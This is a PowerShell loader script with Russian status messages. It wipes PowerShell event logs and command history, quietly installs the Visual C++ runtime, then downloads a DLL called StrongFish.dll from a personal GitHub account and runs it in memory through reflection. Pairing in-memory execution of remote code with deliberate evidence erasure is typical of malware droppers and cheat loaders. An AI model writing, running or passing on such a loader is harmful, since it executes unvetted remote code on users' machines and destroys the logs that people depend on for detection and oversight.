$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8';
function ClrHistory
{
    try {
        Write-Host "УДАЛЕНИЕ ЛОГОВ..." -ForegroundColor Green;
        Clear-EventLog -LogName "Windows Powershell" -Erroraction Stop;
        Remove-Item ($env:AppData + '\Microsoft\Windows\PowerShell') -Recurse -ErrorAction Stop;
        Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction Stop;
    } catch {}
}

Start-Sleep -s 1;
try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    Clear-EventLog -LogName "Windows Powershell" -Erroraction Stop;
}
catch {
    Write-Host "Ошибка. Возможно вы открыли PowerShell не от имени администратора." -ForegroundColor Red;
    break;
}

$temp = $env:TEMP;
$systemPath = "$env:SystemRoot\System32";
$file1 = "$systemPath\msvcp140.dll";
$file2 = "$systemPath\vcruntime140_1.dll";
$file3 = "$systemPath\vcruntime140.dll";
$redistCheck = (Test-Path $file1) -and (Test-Path $file2) -and (Test-Path $file3);

try
{
    if (!$redistCheck)
    {
        $redistFilePath = "$temp\VC_redist.x64.exe"
        try
        {
            Remove-Item $redistFilePath -ErrorAction Ignore;
        }
        catch {}
        Write-Host "СКАЧИВАЕМ..." -ForegroundColor Green;
        try
        {
            Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile "$redistFilePath" -ErrorAction Ignore;
        } catch {
            Write-Host "Ошибка во время скачивания необходимых компонентов." -ForegroundColor Red;
        }
        Write-Host "УСТАНОВКА..." -ForegroundColor Green;
        try
        {
            Start-Process -FilePath $redistFilePath -ArgumentList "/repair", "/quiet", "/norestart" -Wait -ErrorAction Ignore;
            Remove-Item $redistFilePath -ErrorAction Ignore;
        } catch {
            Write-Host "Ошибка 1 во время установки необходимых компонентов. Попробуй запустить от администратора." -ForegroundColor Red;
        }
    }
    Write-Host "ЗАПУСК..." -ForegroundColor Green;
        try
        {
                $webClient = New-Object System.Net.WebClient -ErrorAction Stop;
                $byteArray = $webClient.DownloadData("https://github.com/mrprrr20-gif/dll/blob/main/StrongFish.dll");

                $assembly = [System.Reflection.Assembly]::Load($byteArray);

                $class = $assembly.GetType("Main.Program");



                $method = $class.GetMethod("main");


                $method.Invoke($null, $null);
        }
        finally {}
}
finally
{
    ClrHistory;
}
exit;
